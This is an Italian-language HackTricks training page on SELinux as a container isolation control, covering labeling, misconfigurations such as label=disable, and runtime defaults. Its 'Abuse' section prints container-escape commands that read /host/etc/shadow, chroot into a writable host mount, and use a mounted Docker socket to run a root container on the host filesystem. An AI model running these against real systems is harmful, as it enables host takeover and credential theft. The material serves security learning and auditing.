# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un sistema di controllo degli accessi obbligatorio (Mandatory Access Control) basato sulle etichette. Ogni processo e oggetto rilevante può avere un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, questo di solito significa che il runtime avvia il processo del container sotto un dominio container confinato e etichetta il contenuto del container con tipi corrispondenti. Se la policy funziona correttamente, il processo potrà leggere e scrivere le risorse che la sua etichetta è autorizzata a toccare mentre gli verrà negato l'accesso ad altri contenuti host, anche se tali contenuti diventano visibili tramite un mount.

Questa è una delle protezioni lato host più potenti disponibili nelle comuni distribuzioni Linux per container. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In quegli ambienti, un revisore che ignora SELinux spesso fraintende perché una strada verso il compromesso dell'host che sembra ovvia sia in realtà bloccata.

## AppArmor Vs SELinux

La differenza più semplice a livello alto è che AppArmor è basato sui percorsi mentre SELinux è **basato sulle etichette**. Questo ha grandi conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi in modo diverso se lo stesso contenuto host diventa visibile sotto un percorso di mount inaspettato. Una policy basata sulle etichette invece chiede quale sia l'etichetta dell'oggetto e cosa il dominio del processo può farci. Questo non rende SELinux semplice, ma lo rende robusto contro una classe di assunzioni sui trucchi di percorso che i difensori a volte fanno per errore nei sistemi basati su AppArmor.

Poiché il modello è orientato alle etichette, la gestione dei volumi dei container e le decisioni di relabeling sono critiche per la sicurezza. Se il runtime o l'operatore cambia le etichette in modo troppo ampio per "make mounts work", il confine di policy che doveva contenere il workload può diventare molto più debole del previsto.

## Laboratorio

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per ispezionare le etichette esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare una normale esecuzione con una in cui l'etichettatura è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload che gira nel dominio container previsto e uno a cui è stato rimosso quel livello di applicazione delle policy.

## Runtime Usage

Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux fa parte delle impostazioni di default della piattaforma. Rootless Podman insieme a SELinux costituisce una delle baseline container più robuste nel mainstream perché il processo è già non privilegiato sul lato host ed è comunque confinato dalla policy MAC. Docker può usare SELinux dove è supportato, anche se gli amministratori a volte lo disabilitano per aggirare problemi di etichettatura dei volumi. CRI-O e OpenShift fanno ampio uso di SELinux come parte della loro strategia di isolamento dei container. Kubernetes può esporre impostazioni relative a SELinux, ma il loro valore ovviamente dipende dal fatto che il sistema operativo del nodo supporti e applichi effettivamente SELinux.

La lezione ricorrente è che SELinux non è una guarnizione opzionale. Negli ecosistemi costruiti attorno a esso, fa parte del confine di sicurezza previsto.

## Misconfigurations

L'errore classico è `label=disable`. Operativamente, questo accade spesso perché un mount di un volume è stato negato e la risposta più rapida a breve termine è stata togliere SELinux dall'equazione invece di correggere il modello di etichettatura. Un altro errore comune è il relabeling errato del contenuto host. Ampie operazioni di relabel possono far funzionare l'applicazione, ma possono anche ampliare ciò che il container è autorizzato a toccare ben oltre quanto originariamente previsto.

È inoltre importante non confondere SELinux **installato** con SELinux **effettivo**. Un host può supportare SELinux e trovarsi comunque in modalità permissiva, oppure il runtime potrebbe non lanciare il workload nel dominio previsto. In questi casi la protezione è molto più debole di quanto la documentazione possa suggerire.

## Abuse

Quando SELinux è assente, in modalità permissiva o ampiamente disabilitato per il workload, i path montati dall'host diventano molto più facili da sfruttare. Lo stesso bind mount che altrimenti sarebbe stato vincolato dalle etichette può diventare un canale diretto verso dati dell'host o modifiche all'host. Questo è particolarmente rilevante se combinato con volumi montati in scrittura, directory del runtime del container o scorciatoie operative che hanno esposto path sensibili dell'host per comodità.

SELinux spesso spiega perché una guida generica per il breakout funzioni immediatamente su un host ma fallisca ripetutamente su un altro anche se i flag del runtime sembrano simili. L'ingrediente mancante non è frequentemente un namespace o una capability, ma un confine di etichette che è rimasto intatto.

Il controllo pratico più rapido è confrontare il contesto attivo e quindi sondare i path montati dell'host o le directory del runtime che normalmente sarebbero confinate dalle etichette:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un host bind mount e il labeling di SELinux è stato disabilitato o indebolito, la divulgazione di informazioni spesso avviene prima:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è scrivibile e il container è effettivamente host-root dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host invece di indovinare:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Su host con SELinux abilitato, la perdita delle etichette intorno alle directory di stato runtime può anche esporre percorsi diretti di privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una full escape chain, ma rendono molto rapidamente chiaro se SELinux stava impedendo l'accesso ai dati dell'host o la modifica di file sul lato host.

### Esempio completo: SELinux disabilitato + Writable Host Mount

Se SELinux labeling è disabilitata e il filesystem dell'host è montato in scrittura su `/host`, un full host escape diventa un normale bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se il `chroot` ha successo, il processo del container ora opera dal filesystem dell'host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux disabilitato + Runtime Directory

Se il carico di lavoro può raggiungere un socket del runtime una volta che le etichette sono disabilitate, l'escape può essere delegato al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux spesso era il controllo che impediva esattamente questo tipo di accesso a host-path o runtime-state.

## Controlli

Lo scopo dei controlli SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi di tuo interesse siano effettivamente confinati da etichette.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente appare inatteso o troppo ampio, il workload potrebbe non essere eseguito sotto la policy del container prevista.
- Se i file montati dall'host o le directory runtime hanno label che il processo può accedere troppo liberamente, i bind mounts diventano molto più pericolosi.

Quando si esamina un container su una piattaforma con supporto SELinux, non considerare il labeling come un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già compromesso.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile su host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, rilettichettatura estesa dei bind mounts, `--privileged` |
| Podman | Comunemente abilitato sugli host SELinux | La separazione SELinux è parte normale di Podman sui sistemi SELinux, a meno che non sia disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Non generalmente assegnato automaticamente a livello di Pod | Il supporto SELinux esiste, ma i Pod generalmente necessitano di `securityContext.seLinuxOptions` o di valori predefiniti specifici della piattaforma; sono richiesti il runtime e il supporto del nodo | `seLinuxOptions` deboli o troppo ampi, esecuzione su nodi permissive/disabled, policy di piattaforma che disabilitano il labeling |
| CRI-O / OpenShift style deployments | Spesso su cui si fa ampio affidamento | SELinux è spesso una parte centrale del modello di isolamento dei nodi in questi ambienti | policy personalizzate che ampliano eccessivamente gli accessi, disabilitazione del labeling per compatibilità |

I default di SELinux dipendono più dalla distribuzione rispetto ai default di seccomp. Su sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Su sistemi non SELinux, è semplicemente assente.
{{#include ../../../../banners/hacktricks-training.md}}
